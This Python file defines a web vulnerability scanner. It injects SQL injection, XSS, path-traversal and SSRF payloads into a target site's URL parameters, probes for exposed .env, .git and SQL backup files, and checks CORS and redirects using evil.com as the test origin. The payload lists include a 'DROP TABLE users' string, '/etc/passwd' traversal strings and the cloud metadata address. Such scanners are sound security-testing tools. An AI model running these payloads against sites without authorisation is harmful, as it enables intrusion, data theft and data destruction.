#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import requests
import threading
import re
import time
from urllib.parse import urljoin, urlparse, parse_qs, urlencode, urlunparse
from concurrent.futures import ThreadPoolExecutor, as_completed
from rich.console import Console

console = Console()

requests.packages.urllib3.disable_warnings()

class VulnerabilityScanner:
    def __init__(self, domain, threads=10, timeout=30):
        self.domain = domain
        self.threads = threads
        self.timeout = timeout
        self.base_url = f"https://{domain}"
        self.headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
        self.vulnerabilities = []
        self.lock = threading.Lock()

    def add_vuln(self, vuln_type, url, detail, severity='Medium'):
        with self.lock:
            self.vulnerabilities.append({
                'type': vuln_type,
                'url': url,
                'detail': detail,
                'severity': severity
            })
            color = {'Critical': 'bold red', 'High': 'red', 'Medium': 'yellow', 'Low': 'cyan', 'Info': 'blue'}
            c = color.get(severity, 'white')
            console.print(f"  [bold red]VULN[/bold red] [{c}]{severity}[/{c}] {vuln_type}: {url}")

    def get_test_urls(self):
        """Collect URLs with parameters for testing"""
        urls = []
        try:
            resp = requests.get(self.base_url, headers=self.headers, timeout=self.timeout, verify=False)
            soup_urls = set()

            # Extract links
            from bs4 import BeautifulSoup
            soup = BeautifulSoup(resp.text, 'html.parser')
            for a in soup.find_all('a', href=True):
                href = urljoin(self.base_url, a['href'])
                if self.domain in href and '?' in href:
                    soup_urls.add(href)

            # Find from forms
            for form in soup.find_all('form'):
                action = form.get('action', '')
                if action:
                    full_action = urljoin(self.base_url, action)
                    soup_urls.add(full_action)

            urls = list(soup_urls)[:20]
        except Exception:
            pass
        return urls

    def test_sql_injection(self, url):
        """Test for SQL injection vulnerabilities"""
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        if not params:
            return

        sqli_payloads = [
            "'",
            "''",
            "`",
            "1' OR '1'='1",
            "1' OR '1'='1' --",
            "1' OR 1=1--",
            "\" OR \"\"=\"",
            "' OR 1=1 #",
            "admin'--",
            "1; DROP TABLE users--",
            "1 UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--",
            "1' AND SLEEP(5)--",
            "1; WAITFOR DELAY '0:0:5'--",
        ]

        error_signatures = [
            'sql syntax', 'mysql_fetch', 'ora-', 'oracle', 'postgresql',
            'warning: mysql', 'valid mysql result', 'mysqlclient',
            'sqlite', 'mssql', 'microsoft ole db', 'odbc microsoft access',
            'syntax error', 'unclosed quotation mark', 'microsoft jet database',
            'sql server', 'incorrect syntax near', 'unexpected end of sql',
            "you have an error in your sql", "supplied argument is not",
            'pg_query()', 'pg_exec()', 'unterminated string constant'
        ]

        for param_name in list(params.keys())[:3]:  # Test first 3 params
            for payload in sqli_payloads[:5]:  # Test first 5 payloads
                try:
                    test_params = dict(params)
                    test_params[param_name] = [payload]
                    new_query = urlencode(test_params, doseq=True)
                    test_url = urlunparse(parsed._replace(query=new_query))

                    resp = requests.get(test_url, headers=self.headers,
                                        timeout=self.timeout, verify=False)
                    body_lower = resp.text.lower()

                    for sig in error_signatures:
                        if sig in body_lower:
                            self.add_vuln(
                                'SQL Injection',
                                test_url,
                                f"Possible SQL error detected with payload '{payload}' on param '{param_name}': found '{sig}'",
                                severity='Critical'
                            )
                            return  # Stop testing this URL
                except Exception:
                    pass

    def test_xss(self, url):
        """Test for Cross-Site Scripting vulnerabilities"""
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        if not params:
            return

        xss_payloads = [
            '<script>alert(1)</script>',
            '"><script>alert(1)</script>',
            "';alert(1)//",
            '<img src=x onerror=alert(1)>',
            '"><img src=x onerror=alert(1)>',
            '<svg/onload=alert(1)>',
            '"><svg/onload=alert(1)>',
            'javascript:alert(1)',
            '<body onload=alert(1)>',
        ]

        for param_name in list(params.keys())[:3]:
            for payload in xss_payloads[:5]:
                try:
                    test_params = dict(params)
                    test_params[param_name] = [payload]
                    new_query = urlencode(test_params, doseq=True)
                    test_url = urlunparse(parsed._replace(query=new_query))

                    resp = requests.get(test_url, headers=self.headers,
                                        timeout=self.timeout, verify=False)

                    # Check if payload is reflected
                    if payload in resp.text or payload.lower() in resp.text.lower():
                        self.add_vuln(
                            'Cross-Site Scripting (XSS)',
                            test_url,
                            f"XSS payload reflected on param '{param_name}': {payload[:50]}",
                            severity='High'
                        )
                        return
                except Exception:
                    pass

    def test_lfi(self, url):
        """Test for Local File Inclusion"""
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        if not params:
            return

        lfi_payloads = [
            '../../../etc/passwd',
            '../../../../etc/passwd',
            '../../../../../etc/passwd',
            '../../../../../../etc/passwd',
            '../../../windows/win.ini',
            '....//....//....//etc/passwd',
            '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
            '..%2F..%2F..%2Fetc%2Fpasswd',
        ]

        lfi_signatures = [
            'root:x:', 'daemon:x:', 'bin:x:', 'sys:x:',
            '[extensions]', 'for 16-bit app support',
            'boot loader', '/etc/shadow'
        ]

        for param_name in list(params.keys())[:3]:
            for payload in lfi_payloads[:5]:
                try:
                    test_params = dict(params)
                    test_params[param_name] = [payload]
                    new_query = urlencode(test_params, doseq=True)
                    test_url = urlunparse(parsed._replace(query=new_query))

                    resp = requests.get(test_url, headers=self.headers,
                                        timeout=self.timeout, verify=False)

                    for sig in lfi_signatures:
                        if sig in resp.text:
                            self.add_vuln(
                                'Local File Inclusion (LFI)',
                                test_url,
                                f"LFI successful with payload '{payload}' on param '{param_name}'",
                                severity='Critical'
                            )
                            return
                except Exception:
                    pass

    def test_ssrf(self, url):
        """Test for SSRF vulnerabilities"""
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        if not params:
            return

        # SSRF patterns in parameter names
        ssrf_params = ['url', 'uri', 'link', 'redirect', 'return', 'returnurl', 'callback',
                       'next', 'goto', 'dest', 'target', 'endpoint', 'proxy', 'host',
                       'fetch', 'load', 'open', 'file', 'path', 'source']

        ssrf_payloads = [
            'http://127.0.0.1/',
            'http://localhost/',
            'http://169.254.169.254/',
            'http://[::1]/',
            'http://0.0.0.0/',
        ]

        for param_name in params.keys():
            if any(ssrf in param_name.lower() for ssrf in ssrf_params):
                for payload in ssrf_payloads[:3]:
                    try:
                        test_params = dict(params)
                        test_params[param_name] = [payload]
                        new_query = urlencode(test_params, doseq=True)
                        test_url = urlunparse(parsed._replace(query=new_query))

                        resp = requests.get(test_url, headers=self.headers,
                                            timeout=5, verify=False)
                        # Look for internal responses
                        if resp.status_code == 200 and len(resp.text) > 0:
                            if any(sig in resp.text.lower() for sig in
                                   ['root:', 'localhost', '127.0.0.1', 'internal', 'ami-id']):
                                self.add_vuln(
                                    'Server-Side Request Forgery (SSRF)',
                                    test_url,
                                    f"SSRF possible on param '{param_name}' with payload '{payload}'",
                                    severity='Critical'
                                )
                                return
                    except Exception:
                        pass

    def check_open_redirect(self):
        """Check for open redirect vulnerabilities"""
        console.print(f"  [cyan]→[/cyan] Checking open redirect...")
        redirect_params = ['redirect', 'url', 'next', 'return', 'goto', 'link', 'back', 'continue']
        test_target = 'https://evil.com'

        for param in redirect_params:
            try:
                test_url = f"{self.base_url}?{param}={test_target}"
                resp = requests.get(test_url, headers=self.headers,
                                    timeout=self.timeout, verify=False, allow_redirects=False)
                location = resp.headers.get('Location', '')
                if 'evil.com' in location or test_target in location:
                    self.add_vuln(
                        'Open Redirect',
                        test_url,
                        f"Open redirect via param '{param}' → {location}",
                        severity='Medium'
                    )
            except Exception:
                pass

    def check_cors_misconfiguration(self):
        """Check for CORS misconfiguration"""
        console.print(f"  [cyan]→[/cyan] Checking CORS configuration...")
        try:
            test_headers = dict(self.headers)
            test_headers['Origin'] = 'https://evil.com'
            resp = requests.get(self.base_url, headers=test_headers,
                                timeout=self.timeout, verify=False)
            acao = resp.headers.get('Access-Control-Allow-Origin', '')
            acac = resp.headers.get('Access-Control-Allow-Credentials', '')

            if acao == '*':
                self.add_vuln('CORS Misconfiguration', self.base_url,
                              'Access-Control-Allow-Origin: * (allows any origin)', 'Medium')
            elif acao == 'https://evil.com':
                self.add_vuln('CORS Misconfiguration', self.base_url,
                              f'Reflected ACAO header with credentials={acac}',
                              'High' if acac.lower() == 'true' else 'Medium')
        except Exception:
            pass

    def check_security_misconfigurations(self):
        """Check for common security misconfigurations"""
        console.print(f"  [cyan]→[/cyan] Checking security misconfigurations...")

        # Check for exposed sensitive files
        sensitive_files = [
            ('/.env', 'Exposed .env file'),
            ('/.git/config', 'Exposed Git repository'),
            ('/config.php', 'Exposed config file'),
            ('/phpinfo.php', 'Exposed phpinfo'),
            ('/info.php', 'Exposed phpinfo'),
            ('/server-status', 'Apache server status exposed'),
            ('/server-info', 'Apache server info exposed'),
            ('/.htpasswd', 'Exposed .htpasswd file'),
            ('/.htaccess', 'Exposed .htaccess file'),
            ('/web.config', 'Exposed web.config'),
            ('/backup.sql', 'Exposed SQL backup'),
            ('/db.sql', 'Exposed SQL backup'),
        ]

        for path, description in sensitive_files:
            try:
                url = self.base_url + path
                resp = requests.get(url, headers=self.headers, timeout=self.timeout, verify=False)
                if resp.status_code == 200 and len(resp.text) > 10:
                    severity = 'Critical' if any(s in path for s in ['.env', '.git', '.sql', 'config']) else 'High'
                    self.add_vuln('Security Misconfiguration', url, description, severity)
            except Exception:
                pass

    def check_clickjacking(self):
        """Check for clickjacking vulnerability"""
        console.print(f"  [cyan]→[/cyan] Checking clickjacking protection...")
        try:
            resp = requests.get(self.base_url, headers=self.headers,
                                timeout=self.timeout, verify=False)
            xfo = resp.headers.get('X-Frame-Options', '')
            csp = resp.headers.get('Content-Security-Policy', '')

            if not xfo and 'frame-ancestors' not in csp.lower():
                self.add_vuln(
                    'Clickjacking',
                    self.base_url,
                    'Missing X-Frame-Options and CSP frame-ancestors directive',
                    'Medium'
                )
        except Exception:
            pass

    def check_ssl_vulnerabilities(self):
        """Check for SSL/TLS vulnerabilities"""
        console.print(f"  [cyan]→[/cyan] Checking SSL/TLS configuration...")
        import ssl
        import socket

        try:
            # Check for TLS 1.0/1.1 support (deprecated)
            for proto, name in [
                (ssl.PROTOCOL_TLS_CLIENT, 'TLS'),
            ]:
                ctx = ssl.SSLContext(proto)
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE

                try:
                    ctx.minimum_version = ssl.TLSVersion.TLSv1
                    ctx.maximum_version = ssl.TLSVersion.TLSv1
                    with ctx.wrap_socket(socket.socket(), server_hostname=self.domain) as s:
                        s.settimeout(5)
                        s.connect((self.domain, 443))
                        self.add_vuln(
                            'Outdated TLS Version',
                            f"https://{self.domain}",
                            'TLS 1.0 is supported - deprecated and insecure protocol',
                            'Medium'
                        )
                except Exception:
                    pass

                try:
                    ctx.minimum_version = ssl.TLSVersion.TLSv1_1
                    ctx.maximum_version = ssl.TLSVersion.TLSv1_1
                    with ctx.wrap_socket(socket.socket(), server_hostname=self.domain) as s:
                        s.settimeout(5)
                        s.connect((self.domain, 443))
                        self.add_vuln(
                            'Outdated TLS Version',
                            f"https://{self.domain}",
                            'TLS 1.1 is supported - deprecated and insecure protocol',
                            'Low'
                        )
                except Exception:
                    pass
        except Exception:
            pass

    def scan(self):
        """Run all vulnerability scans"""
        # Get URLs to test
        console.print(f"  [cyan]→[/cyan] Collecting test URLs...")
        test_urls = self.get_test_urls()
        console.print(f"  [cyan]→[/cyan] Found {len(test_urls)} URLs with parameters to test")

        # Static checks
        self.check_security_misconfigurations()
        self.check_cors_misconfiguration()
        self.check_clickjacking()
        self.check_open_redirect()
        self.check_ssl_vulnerabilities()

        # Dynamic parameter testing
        if test_urls:
            console.print(f"  [cyan]→[/cyan] Testing for SQLi, XSS, LFI, SSRF...")
            with ThreadPoolExecutor(max_workers=self.threads) as executor:
                futures = []
                for url in test_urls:
                    futures.append(executor.submit(self.test_sql_injection, url))
                    futures.append(executor.submit(self.test_xss, url))
                    futures.append(executor.submit(self.test_lfi, url))
                    futures.append(executor.submit(self.test_ssrf, url))
                for f in as_completed(futures):
                    f.result()
        else:
            console.print(f"  [yellow]![/yellow] No URLs with parameters found for dynamic testing")

        severity_count = {'Critical': 0, 'High': 0, 'Medium': 0, 'Low': 0, 'Info': 0}
        for v in self.vulnerabilities:
            severity_count[v.get('severity', 'Info')] = severity_count.get(v.get('severity', 'Info'), 0) + 1

        console.print(f"  [green]✓[/green] Scan complete: "
                      f"[bold red]{severity_count['Critical']} Critical[/bold red] | "
                      f"[red]{severity_count['High']} High[/red] | "
                      f"[yellow]{severity_count['Medium']} Medium[/yellow] | "
                      f"[cyan]{severity_count['Low']} Low[/cyan]")

        return {
            'total': len(self.vulnerabilities),
            'severity_count': severity_count,
            'vulnerabilities': self.vulnerabilities
        }
